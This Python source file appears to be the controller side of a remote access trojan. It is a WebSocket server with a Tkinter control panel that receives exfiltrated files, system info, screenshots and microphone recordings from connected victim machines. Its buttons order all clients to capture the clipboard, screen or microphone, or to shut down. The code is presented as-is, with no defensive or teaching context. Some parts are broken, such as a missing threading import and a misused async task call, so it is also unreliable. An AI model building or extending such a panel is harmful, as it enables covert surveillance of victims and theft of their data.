import asyncio
import websockets
import json
import base64
import tkinter as tk
from tkinter import filedialog, messagebox
from crypto import encrypt, decrypt
import io
from PIL import Image, ImageTk

# Settings
SERVER_PORT = 8765
clients = []  # List to store active clients

def send_message(client, message):
    """Send encrypted message to a client."""
    encrypted_message = encrypt(message)
    asyncio.create_task(client.send(encrypted_message))

async def handle_client(websocket, path):
    """Handles incoming WebSocket connections from clients."""
    clients.append(websocket)
    try:
        while True:
            message = await websocket.recv()
            decrypted_message = decrypt(message)
            data = json.loads(decrypted_message)

            if data["type"] == "info":
                display_info(data["data"])

            elif data["type"] == "file":
                display_file(data["filename"], data["filedata"])

            elif data["type"] == "mic":
                display_mic(data["filedata"])

            elif data["type"] == "screenshot":
                display_screenshot(data["filedata"])

            elif data["type"] == "cmd":
                handle_cmd(websocket, data)

    except Exception as e:
        print(f"Error handling client: {e}")
    finally:
        clients.remove(websocket)

async def start_server():
    """Starts the WebSocket server."""
    server = await websockets.serve(handle_client, "0.0.0.0", SERVER_PORT)
    await server.wait_closed()

def start_server_async():
    """Start the server in a new asyncio thread."""
    asyncio.run(start_server())

# GUI functions
def display_info(info):
    """Display system info received from client."""
    info_box.insert(tk.END, f"[INFO] {info}\n")
    info_box.yview(tk.END)

def display_file(filename, filedata):
    """Display file contents from the client."""
    file_content = base64.b64decode(filedata)
    with open(f"received_{filename}", "wb") as file:
        file.write(file_content)
    info_box.insert(tk.END, f"[FILE] {filename} received and saved.\n")
    info_box.yview(tk.END)

def display_mic(filedata):
    """Play back and display microphone recording."""
    audio_content = base64.b64decode(filedata)
    with open("recording.wav", "wb") as file:
        file.write(audio_content)
    info_box.insert(tk.END, "[MIC] Recording saved as 'recording.wav'.\n")
    info_box.yview(tk.END)

def display_screenshot(filedata):
    """Display screenshot received from client."""
    image_content = base64.b64decode(filedata)
    image = Image.open(io.BytesIO(image_content))
    image.show()
    info_box.insert(tk.END, "[SCREENSHOT] Screenshot received and displayed.\n")
    info_box.yview(tk.END)

def handle_cmd(websocket, data):
    """Handle commands received from client."""
    if data["command"] == "get_clipboard":
        send_message(websocket, json.dumps({"type": "clipboard"}))

def send_cmd_to_all_clients(command):
    """Send command to all connected clients."""
    for client in clients:
        send_message(client, json.dumps({"type": "cmd", "command": command}))

def on_send_clipboard_command():
    """Send clipboard command to all clients."""
    send_cmd_to_all_clients("get_clipboard")

def on_take_screenshot():
    """Send screenshot command to all clients."""
    send_cmd_to_all_clients("screenshot")

def on_record_microphone():
    """Send microphone recording command to all clients."""
    send_cmd_to_all_clients("record_mic")

def on_shutdown():
    """Shutdown all clients."""
    for client in clients:
        send_message(client, json.dumps({"type": "shutdown"}))

# GUI setup
root = tk.Tk()
root.title("Server Control Panel")

# Create and configure the Text widget for displaying received data
info_box = tk.Text(root, height=20, width=80)
info_box.pack(padx=10, pady=10)

# Create and configure the Buttons
btn_clipboard = tk.Button(root, text="Get Clipboard", command=on_send_clipboard_command)
btn_clipboard.pack(padx=10, pady=5)

btn_screenshot = tk.Button(root, text="Take Screenshot", command=on_take_screenshot)
btn_screenshot.pack(padx=10, pady=5)

btn_mic = tk.Button(root, text="Record Microphone", command=on_record_microphone)
btn_mic.pack(padx=10, pady=5)

btn_shutdown = tk.Button(root, text="Shutdown Clients", command=on_shutdown)
btn_shutdown.pack(padx=10, pady=5)

# Start the server in a background thread
server_thread = threading.Thread(target=start_server_async)
server_thread.start()

# Start the GUI
root.mainloop()